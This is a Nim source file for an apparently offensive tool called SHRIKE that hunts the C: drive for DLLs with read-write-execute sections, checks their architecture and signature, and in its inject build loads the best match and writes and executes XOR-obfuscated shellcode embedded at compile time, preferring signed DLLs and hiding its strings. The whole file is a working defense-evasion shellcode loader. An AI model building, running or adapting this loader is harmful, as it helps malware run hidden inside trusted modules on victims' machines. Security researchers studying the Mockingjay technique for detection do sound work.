#[
    Hunting for and injecting RWX 'mockingjay' DLLs in pure nim.

    Gives info on:
        - RWX memory region size
        - Architecture of the DLL
        - If the DLL is signed
    

    Includes capabilities to load, and inject shellcode into, a discovered 'mockingjay' DLL if one is suitable for injection.
    Shellcode is specified at compile-time and is stored XOR'd in memory until injection phase (if shrike was compiled with the `-d:inject` flag)
]# 

import winim/lean # dep
import termstyle # dep: https://github.com/PMunch/termstyle
import suru # dep: https://github.com/de-odex/suru
import regex # dep: https://github.com/nitely/nim-regex
import std/[os, sequtils, strutils, bitops, volatile, strformat, sugar, terminal, segfaults]
import nimprotect

const PROG_NAME = "SHRIKE"
const KEY = @[byte 0xDE,0xAD,0xBE,0xEF,0x04,0x20,0x69] # TODO: refactor to make all key functions work for a string - and then have it be a compiletime flag
const SHELLCODE {.strdefine.} = r"../bin/shellcode.bin".protectString()
const BANNER = protectString(splitString(red"""
↑↑↑↑↑↑↑↑↑↑↑↑↑↑   ↑↑↑↑ ↑↑↑↑↑↑↑↑↑↑ ↑↑↑↑↑ ↑↑↑↑  ↑↑↑  ↑↑↑↑↑↑↑↑↑
 ↑↑↑↑↑↑↑↑↑  ↑↑↑   ↑↑↑   ↑↑↑↑↑↑↑↑↑  ↑↑↑   ↑↑↑ ↑↑↑   ↑↑↑↑↑↑↑↑↑
 ↑↑↑   ↑↑↑  ↑↑↑   ↑↑↑   ↑↑↑  ↑↑↑↑  ↑↑↑   ↑↑↑↑↑↑    ↑↑↑   ↑↑↑
 ↑↑↑↑↑   ↑  ↑↑↑   ↑↑↑   ↑↑↑  ↑↑↑↑  ↑↑↑  ↑↑↑↑↑↑↑↑↑  ↑↑↑↑↑↑   
    ↑↑↑↑↑  ↑↑↑↑↑↑↑↑↑↑   ↑↑↑ ↑↑↑↑↑  ↑↑↑   ↑↑↑   ↑↑↑ ↑↑↑↑↑↑   
 ↑↑    ↑↑↑  ↑↑↑↑↑↑↑↑↑  ↑↑↑↑↑↑↑↑↑↑↑ ↑↑↑   ↑↑↑   ↑↑↑ ↑↑↑   ↑↑↑
 ↑↑↑   ↑↑↑  ↑↑↑   ↑↑↑   ↑↑↑   ↑↑↑  ↑↑↑   ↑↑↑   ↑↑↑ ↑↑↑   ↑↑↑
 ↑↑↑ ↑↑↑↑↑  ↑↑↑   ↑↑↑   ↑↑↑   ↑↑↑  ↑↑↑   ↑↑↑   ↑↑↑ ↑↑↑  ↑↑↑↑
 ↑↑↑↑↑↑↑    ↑↑↑   ↑↑↑   ↑↑↑   ↑↑↑  ↑↑↑   ↑↑↑   ↑↑  ↑↑↑↑↑↑↑  
 ↑↑↑↑↑      ↑↑↑    ↑↑         ↑↑↑  ↑↑↑   ↑↑↑       ↑↑↑↑↑    
 ↑↑↑        ↑↑↑               ↑↑↑  ↑↑↑   ↑↑↑       ↑↑↑      
 ↑          ↑                   ↑  ↑     ↑         ↑        
"""))

type
    MockingJay = object
        dllName: string
        isSigned: bool
        isX64: bool
        sections: seq[IMAGE_SECTION_HEADER]

# print template - implements the -d:silent compiler flag
template `print` (ss: varargs[string, `$`]) =
    when (not defined SILENT):
        var str = ""
        for s in ss:
            str &= s
        echo red &"[{PROG_NAME}] ", str

# debug print template - https://nim-lang.org/docs/tut2.html#templates
template `debug` (ss: varargs[string, `$`]) =
    when (defined DEBUG) and (not defined SILENT):
        var str = ""
        for s in ss:
            str &= s
        echo magenta &"[{PROG_NAME} - DEBUG] ", str

# Analyze template - this locks code behind the "analyze" nim compiler flag (`-d:analyze`)
template `analyze` (b: untyped) =
    when defined ANALYZE:
        b

# Inject template - this locks code behind the "inject" nim compiler flag (`-d:inject`)
template `inject` (b: untyped) =
    when defined INJECT:
        b

# catches generic errors
template `catch` (b: untyped) =
    try:
        b
    except CatchableError:
        debug red(&"[Exception]"),  &"{getCurrentExceptionMsg()}"

proc prettyPrintBytes*(bytes: seq[byte]): string =
    const MAXLEN = 16
    var count = 1
    result = "" # unnecesary but for sanity
    result.add("array[" & $bytes.len() & ", byte] = [\n    byte ")
    for i in bytes:
        if count == bytes.len():
            result.add("0x" & toHex(i.int) & "]")
            break
        elif count.mod(MAXLEN) == 0:
            result.add("\n    ")
        result.add("0x" & toHex(i.int) & ",")
        count += 1

proc readFileBytes(fullName: string): seq[byte] =
    var
        file = open(fullName, fmRead)
        b = cast[seq[byte]](file.readAll())
    file.close()
    return b

# compile-time functions to xor a file on disk for rsrc embedding
inject:
    proc staticRollXor(data: seq[byte], key: seq[byte]): seq[byte] {.compiletime.} =
        var xordBytes: seq[byte]
        var j: int =0
        var b: int = 0
        for i in 0..<data.len:
            if j == key.len - 1:
                j = 0
            inc(b)
            xordBytes.add(data[i] xor key[j])
            inc(j)
        return xordBytes

    proc rollxor(data: seq[byte], key: seq[byte]): seq[byte] =
        var xordBytes: seq[byte]
        var j: int =0
        var b: int = 0
        for i in 0..<data.len:
            if j == key.len - 1:
                j = 0
            inc(b)
            xordBytes.add(data[i] xor key[j])
            inc(j)
        return xordBytes

    proc rollxor(data: ptr seq[byte], key: seq[byte]) =
        var j: int =0
        var b: int = 0
        for i in 0..<data[].len:
            if j == key.len - 1:
                j = 0
            inc(b)
            data[][i] = data[i] xor key[j]
            inc(j)

    proc staticReadEnc(filename:string, key: seq[byte]): seq[byte] {.compiletime.} = 
        var
            str = slurp(SHELLCODE)
            bytes = @str
            encBytes = rollxor(bytes.mapIt(it.byte), key)
        return encBytes


proc analyze(filename: string): MockingJay =
    # Read bytes
    debug cyan ("Analyzing " & fileName & "...")
    var fileBytesNonVolatile: seq[byte]
    fileBytesNonVolatile = readFileBytes(fileName)
    
    if fileBytesNonVolatile.len() == 0: return
        
    debug "fileBytes: ", fileBytesNonVolatile.len()
    var fileBytes: seq[byte] = fileBytesNonVolatile#volatileLoad(addr fileBytesNonVolatile) - doesn't seem to be needed + is a memory hog
    debug "fileBytesVolatile: ", fileBytes.len()

    var mzMagic = (fileBytes[0].char & fileBytes[1].char)
    debug "magicBytes: ", mzMagic
    if mzMagic != "MZ":
        debug white(&"{filename}: ") & yellow(&"Bad magic bytes: {mzMagic}")
        return

    # optHeaederOffset
    var optHeaderOffset: LONG = cast[ptr LONG](addr fileBytes[60])[]
    debug "optHeaderOffset = ", toHex(optHeaderOffset.int), &"({optHeaderOffset})"

    var peSignature = join(cast[seq[char]](fileBytes[optHeaderOffset..optHeaderOffset + 4]))
    if peSignature[0] != 'P' or peSignature[1] != 'E':
        debug white(&"{filename}: ") & yellow(&"Not a PE file (sig: {cast[ptr WORD](addr peSignature[0])[].int.toHex()})")
        return

    var coffset = optHeaderOffset.int + 4
    debug "coffset = ", toHex(coffset), &"({coffset})"

    var coffFileHeader: IMAGE_FILE_HEADER = cast[ptr IMAGE_FILE_HEADER](addr fileBytes[coffset])[] # `0x3c` is the size of the DOS-stub + 4-byte signatture ("PE\0\0") = COFF File Header (https://learn.microsoft.com/en-us/windows/win32/debug/pe-format?redirectedfrom=MSDN#coff-file-header-object-and-image)
    #debug "peOffset = ", toHex(peOffset), &"({peOffset})"

    var peMagic: WORD = cast[ptr WORD](addr fileBytes[coffset + sizeof(IMAGE_FILE_HEADER)])[]
    debug "peMagic = ", peMagic.int.toHex(), &" ({(peMagic == WORD 0x10B) or (peMagic == WORD 0x20B) })"
    var isX64:bool
    if peMagic == WORD 0x10B:
        isX64 = false
        debug "ARCH: x32"
    elif peMagic == WORD 0x20B:
        isX64 = true
        debug "ARCH: x64"
    else:
        debug red"Malformed optional header magic number"
        return

    # If we made it here, the file is indeed a PE file and we can go ahead with further analysis - so at this point we will create a new object for returning
    var jay: MockingJay = MockingJay(dllName: filename, isX64: isX64)

    #[
        This section of code is responsible for looking for signed certificates in the PE
    ]#
    #var isSigned: bool
    var certTableVA: int
    var certTableSize: int
    var cursor: int
    # https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#optional-header-data-directories-image-only
    if isX64:
        var ntHeader: IMAGE_OPTIONAL_HEADER64 = cast[ptr IMAGE_OPTIONAL_HEADER64](addr fileBytes[coffset + sizeof(IMAGE_FILE_HEADER)])[]
        certTableVA = ntHeader.DataDirectory[4].VirtualAddress.int
        cursor = certTableVA
        certTableSize = ntHeader.DataDirectory[4].Size.int
    else:
        var ntHeader: IMAGE_OPTIONAL_HEADER32 = cast[ptr IMAGE_OPTIONAL_HEADER32](addr fileBytes[coffset + sizeof(IMAGE_FILE_HEADER)])[]
        certTableVA = ntHeader.DataDirectory[4].VirtualAddress.int
        cursor = certTableVA
        certTableSize = ntHeader.DataDirectory[4].Size.int

    debug "certTableVA: ", certTableVA
    debug "certTableSize: ", certTableSize

    # read the first member var (dwLength) to get the size of the certEntry
    var certEntrySize  = cast[ptr DWORD](addr fileBytes[certTableVA])[]
    debug "certEntrySize: ", certEntrySize
    var certType: WORD
    var revision: WORD
    var certPtr: int # = 8 + cursor
    while (certTableSize > 0) and (not (cursor >= (certTableVA.int + certTableSize.int))):
        revision = cast[ptr WORD](addr fileBytes[cursor.int + 4])[]
        debug blue"(cert) ", &"revision:{revision.int.toHex()}"
        if not (revision == 0x0100 or # WIN_CERT_REVISION_1_0
            revision == 0x0200): # WIN_CERT_REVISION_2_0
            debug blue"(cert) ", red(&"Bad revision code!")
            jay.isSigned = false
            break
        certType = cast[ptr WORD](addr fileBytes[cursor.int + 6])[]
        debug blue"(cert) ", &"revision:{certType.int.toHex()}"
        if certType == 0x02: # WIN_CERT_TYPE_PKCS_SIGNED_DATA
            jay.isSigned = true
            debug blink(blue"(cert) ", &"Signed:{jay.isSigned}")
        else:
            jay.isSigned = false
            debug blue"(cert) ", &"Signed:{jay.isSigned}"

        cursor = cursor + certEntrySize + ((cursor + certEntrySize) mod 8) # allignment


    #[
        Enumerate the sections
    ]#
    var numSections: int = coffFileHeader.NumberOfSections.int
    debug "numSections = ", numSections
    var pSectionTable: ptr UncheckedArray[IMAGE_SECTION_HEADER] =  cast[ptr UncheckedArray[IMAGE_SECTION_HEADER]](&fileBytes[coffset + sizeof(IMAGE_FILE_HEADER) + coffFileHeader.SizeOfOptionalHeader.int]) # https://learn.microsoft.com/en-us/windows/win32/debug/pe-format?redirectedfrom=MSDN#section-table-section-headers
    #[  https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_section_header
        IMAGE_SECTION_HEADER* {.pure.} = object
        Name*: array[IMAGE_SIZEOF_SHORT_NAME, BYTE]
        Misc*: IMAGE_SECTION_HEADER_Misc
        VirtualAddress*: DWORD
        SizeOfRawData*: DWORD
        PointerToRawData*: DWORD
        PointerToRelocations*: DWORD
        PointerToLinenumbers*: DWORD
        NumberOfRelocations*: WORD
        NumberOfLinenumbers*: WORD
        Characteristics*: DWORD
    ]#
    
    #print PE sig
    debug "PE Signature: ", fileBytes[optHeaderOffset].char & fileBytes[optHeaderOffset+1].char

    #print coff heaeder
    debug &"COFF Header: arch:{coffFileHeader.Machine.int.toHex()}, sections: {numSections}, size: {coffFileHeader.SizeOfOptionalHeader.int}"    

    var sectionHeader: IMAGE_SECTION_HEADER
    for s in 0..numSections-1:
        sectionHeader = pSectionTable[][s]
        
        # Assign some pretty colors to the protection string
        when (defined ANALYZE) or (defined DEBUG): # no template here
            var protect: string = ""
            if sectionHeader.Characteristics.bitand(IMAGE_SCN_MEM_READ) == IMAGE_SCN_MEM_READ: protect.add(cyan"r")
            else: protect.add("-")
            if sectionHeader.Characteristics.bitand(IMAGE_SCN_MEM_WRITE) == IMAGE_SCN_MEM_WRITE: protect.add(green"w")
            else: protect.add("-")
            if sectionHeader.Characteristics.bitand(IMAGE_SCN_MEM_EXECUTE) == IMAGE_SCN_MEM_EXECUTE: protect.add(red"x")
            else: protect.add("-")
        
        # string building for output
        when (defined ANALYZE) or (defined DEBUG):

            var signStatus: string = ""
            if jay.isSigned: signStatus = blink blue"SIGNED"
            else: discard

            var archStatus: string = ""
            when defined arch64:
                if isX64: archStatus.add(magenta"x64")
                else: archStatus.add("x32")
            elif defined arch32: 
                if isX64: archStatus.add("x64")
                else: archStatus.add(magenta"x32")
        
        when defined DEBUG: # needed because we are using string interpolation w/ a var that is only 'in scope' if debug is defined
            debug &"Section: {s} Size: {$(sectionHeader.SizeOfRawData.int/1024).int}kb Protect: {protect} Arch: {archStatus}"

        # Hunt for RWX sections
        if sectionHeader.Characteristics.bitand(IMAGE_SCN_MEM_EXECUTE) == IMAGE_SCN_MEM_EXECUTE and
            sectionHeader.Characteristics.bitand(IMAGE_SCN_MEM_READ) == IMAGE_SCN_MEM_READ and
            sectionHeader.Characteristics.bitand(IMAGE_SCN_MEM_WRITE ) == IMAGE_SCN_MEM_WRITE:
                # Add it to our bucket of notable DLL sections
                jay.sections.add(sectionHeader)
                when (defined ANALYZE): # The linter was choking on the analyze template here - compiles fine but I must squash red squiglles...
                    if (sectionHeader.SizeOfRawData.int/1024).int < 100:
                        print &"{fileName}: Section: {s} Size: {$(sectionHeader.SizeOfRawData.int/1024).int}kb ", &"Protect: {protect} {archStatus} {signStatus}"
                    elif (sectionHeader.SizeOfRawData.int/1024).int > 100 and ((sectionHeader.SizeOfRawData.int)/1024/1024) < 1.0:
                        print &"{fileName}: Section: {s} ", cyan &"Size: {$(sectionHeader.SizeOfRawData.int/1024).int}kb ", &"Protect: {protect} {archStatus} {signStatus}"
                    elif (sectionHeader.SizeOfRawData.int/1024/1024).int > 1 and (sectionHeader.SizeOfRawData.int/1024/1024).int < 5:
                        print &"{fileName}: Section: {s} ", yellow &"Size: {$(sectionHeader.SizeOfRawData.int/1024/1024).int}mb ", &"Protect: {protect} {archStatus} {signStatus}"
                    elif (sectionHeader.SizeOfRawData.int/1024/1024).int > 5: 
                        print &"{fileName}: Section: {s} ", green &"Size: {$(sectionHeader.SizeOfRawData.int/1024/1024).int}mb ", &"Protect: {protect} {archStatus} {signStatus}"
            
    return jay

proc huntJays(path: string): seq[MockingJay] =
    var
        dlls: seq[string]
        jays: seq[MockingJay]
    print &"Counting DLLs - patience please..."
    for entry in walkDirRec(path):
        #debug &"search: {entry}"
        var p = r"^C:(.*)\.dll$"
        if entry.match(re2(p)): # this is perl-style regex
            dlls.add(entry)
    print &"Found {dlls.len()} dlls."
    print "Hunting..."
    when (not defined SILENT) or (not defined DEBUG):        
        for dll in suru(dlls):
            #if dll.match (re2(r"^C:(.*)msys-2.0\.dll")): echo cyan &"We Found It! {dll}"
            debug "Analyzing ", dll, "..."
            var jay: MockingJay
            catch:
                jay = analyze(dll)
                if jay.sections.len() > 0: # only RWX memory sections are populated in the resulting MockingJay object from analyze()
                    jays.add(jay)
                #debug green "[findDlls]", &" Found DLL:  {entry}"
    else:
        for dll in dlls:
            var jay: MockingJay
            catch:
                jay = analyze(dll)
                if jay.sections.len() > 0: # only RWX memory sections are populated in the resulting MockingJay object from analyze()
                    jays.add(jay)
    return jays
            
proc sanity(s: string) = 
    catch:
        discard analyze(s)

inject:
    proc decryptLoadAndInject(jay: MockingJay, shellcode: seq[byte]) =
        # load the dll
        var
            wDllName = newWideCstring(jay.dllName)
        var hTargetImage: HANDLE  = LoadLibraryW(cast[LPCWSTR](addr wDllName[0]))
        #print &"DllName: {jay.dllName}"
        debug &"DllBase: {cast[SIZE_T](hTargetImage).int.toHex()}"
        debug &"GetLastError: {GetLastError().int.toHex()}"
        
        # Get the the loaded target image
        var elfanewVA = cast[SIZE_T](hTargetImage) + 0x3c
        debug  &"elfanewVA: {elfanewVA.int.toHex()}"
        var imageSize: DWORD = 0
        var optHeaderRVA = cast[ptr LONG](cast[PVOID](elfanewVA))[]
        debug  &"optHeaderRVA: {optHeaderRVA.int.toHex()}"
        var magicOffset = optHeaderRVA.int + 4 + sizeof(IMAGE_FILE_HEADER)
        if cast[ptr WORD](magicOffset + cast[SIZE_T](hTargetImage))[] == 0x10b: #IMAGE_NT_OPTIONAL_HDR32_MAGIC
            var ntHeader = cast[ptr IMAGE_OPTIONAL_HEADER32](cast[PVOID](magicOffset + cast[SIZE_T](hTargetImage)))[]
            imageSize = ntHeader.SizeOfImage
        elif cast[ptr WORD](magicOffset + cast[SIZE_T](hTargetImage))[] == 0x20b: #IMAGE_NT_OPTIONAL_HDR64_MAGIC
            var ntHeader = cast[ptr IMAGE_OPTIONAL_HEADER64](cast[PVOID](magicOffset + cast[SIZE_T](hTargetImage)))[]
            imageSize = ntHeader.SizeOfImage
        else:
            print &"Magic bytes: {cast[ptr WORD](magicOffset + cast[SIZE_T](hTargetImage))[].int.toHex()}"
            return
        
        debug &"imageSize: {imageSize}"
        if imageSize == 0: return

        # Read all memory segments to find the target section
        debug "Reading memory segment protections..."
        debug "Looking for ", jay.sections[0].SizeOfRawData.int.toHex(), " byte section."
        var
            segPtr = cast[PVOID](hTargetImage)
            mbi: MEMORY_BASIC_INFORMATION
        while (not (cast[SIZE_T](segPtr) >= cast[SIZE_T](hTargetImage) + cast[SIZE_T](imageSize))) and VirtualQuery(segPtr, addr mbi, sizeof(MEMORY_BASIC_INFORMATION).SIZE_T).int.bool:
            debug &"SegEnum-> segAddr: {cast[SIZE_T](mbi.BaseAddress).toHex()}, segSize: {mbi.RegionSize}, segProtect: {mbi.Protect.toHex()}, segState: {mbi.State.toHex()}, segType: {mbi.Type.toHex()}"
            if mbi.Protect == PAGE_EXECUTE_READWRITE and mbi.State == MEM_COMMIT: # only care about RWX sections
                if mbi.RegionSize.SIZE_T >= shellcode.len():
                    # decrypt shellcode
                    debug "Decrypting $hellc0de..."
                    var decShellcode = rollxor(shellcode, KEY)
                    # write mem
                    debug &"Writing $hellc0de to {cast[SIZE_T](segPtr).toHex()}..."
                    copyMem(segPtr, unsafeAddr decShellcode[0], shellcode.len())
                    #print echo "decrypted -> ", prettyPrintBytes(decShellcode)
                    # execute shellcode
                    debug "Executing $hellc0de..."
                    cast[proc(){.stdcall.}](segPtr)()
                    return

            segPtr = cast[PVOID](cast[SIZE_T](segPtr) + mbi.RegionSize.SIZE_T) # incrementing the segPtr by the region size gets us to the base of the next region

        # write to the section

        # exucte

when isMainModule:
    # Compiletime operations
    static: echo BANNER
    inject: # compile-time shellcode encryption
        const shellcode: seq[byte] = staticReadEnc(SHELLCODE, KEY) # neat huh?
        catch:
            static: # compile-time checks - could gate this behind -d:debug or -d:silent but why?
                echo blue"--= COMPILE-TIME TESTS =--"
                echo  &"Size of encShellcode: {shellcode.len()}"
                var
                    decShellcode: seq[byte] = staticRollXor(shellcode, KEY)
                # https://nim-lang.org/docs/sequtils.html#mapIt.t%2Ctyped%2Cuntyped
                if ((@(slurp(SHELLCODE))).mapIt(it.byte) != decShellcode):
                    echo "staticReadEnc() failed compile-time function check!"
                else: echo "staticReadEnc()",  " passed compile-time function check!"
                discard
                #echo "decrypted -> ", prettyPrintBytes(decShellcode)
        # - can we shim a compile-time encrypt into slurp instead?
        # - no, its not a macro but a vm operation (At least I think thats what `{.magic: "Slurp".}` means...)
        # https://stackoverflow.com/questions/55891650/how-to-use-slurp-gorge-staticread-staticexec-in-the-directory-of-the-callsite
        # Maybe but it will be a pain...
    
    # Program execution start
    when not defined SILENT:
        echo BANNER

    when defined DEBUG:
        sanity(r"C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\Common7\IDE\CommonExtensions\Microsoft\TeamFoundation\Team Explorer\Git\usr\bin\msys-2.0.dll") # Testing a file with known RWX section
        sanity(r"C:\Users\Deviant\Desktop\rt-tooling\WorkflowUtils\RWX-Hunter\bin\temp test\JayHunter.exe") # testing file with space in path
        sanity(r"c:\Windows\System32\ntdll.dll") # testing file with signature
        sanity(r"Test exception handling by opening a file that doesn't exist...")
        debug red"--- Inject mode testing ---"
    
    var jays: seq[MockingJay]

    #[ temp code for quicker dev-time
    var jay = analyze(r"C:\Program Files\Git\usr\bin\msys-2.0.dll")
    if jay.sections.len() > 0:
        jays.add(jay)
    jay  = analyze(r"C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\Common7\IDE\CommonExtensions\Microsoft\TeamFoundation\Team Explorer\Git\usr\bin\msys-2.0.dll")
    if jay.sections.len() > 0:
        jays.add(jay)
    # C:\Program Files (x86)\InstallShield Installation Information\{15D27BA3-6CCD-4848-8925-07EF083492AD}\ISSetup.dll - these install shield DLLs are all 32-bit...
    #[\ temp code for quicker dev-time]#
    ]#

    jays = huntJays(r"C:\")

    inject:
        var
            targetSigned: MockingJay = MockingJay()
            targetUnsigned: MockingJay = MockingJay()
        
        targetSigned.sections.add(IMAGE_SECTION_HEADER())
        targetUnsigned.sections.add(IMAGE_SECTION_HEADER())
        targetSigned.sections[0].SizeofRawData = 0
        targetUnsigned.sections[0].SizeofRawData = 0

        # findTargets
        for jay in jays:
            for section in jay.sections:
                if (shellcode.len() <= section.SizeofRawData):
                    if (jay.isSigned and section.SizeofRawData > targetSigned.sections[0].SizeofRawData):
                        when defined arch64:
                            if jay.isX64:
                                targetSigned.dllName = jay.dllName
                                targetSigned.sections[0] = section
                        elif defined arch32:
                            if not jay.isX64:
                                
                                targetSigned.dllName = jay.dllName
                                targetSigned.sections[0] = section
                    elif ((not jay.isSigned) and section.SizeofRawData > targetUnsigned.sections[0].SizeofRawData):
                        when defined arch64:
                            if jay.isX64:
                                targetUnsigned.dllName = jay.dllName
                                targetUnsigned.sections[0] = section
                        elif defined arch32:
                            if not jay.isX64:
                                targetUnsigned.dllName = jay.dllName
                                targetUnsigned.sections[0] = section
                        
                else: discard 
        
        if targetSigned.sections[0].SizeofRawData >= shellcode.len():
            print &"Injecting {targetSigned.dllName} ", blue"(signed)".protectString()
            decryptLoadAndInject(targetSigned, shellcode)
        elif (targetUnsigned.sections[0].SizeofRawData >= shellcode.len()) and not defined ONLYSIGNED:
            print &"Injecting {targetSigned.dllName} (unsigned)".protectString() # pretty sure this won't work with interpolated strings but I didn't dig into the code...
            decryptLoadAndInject(targetUnsigned, shellcode)
        else:
            print "No suitable injection targets found".protectString()
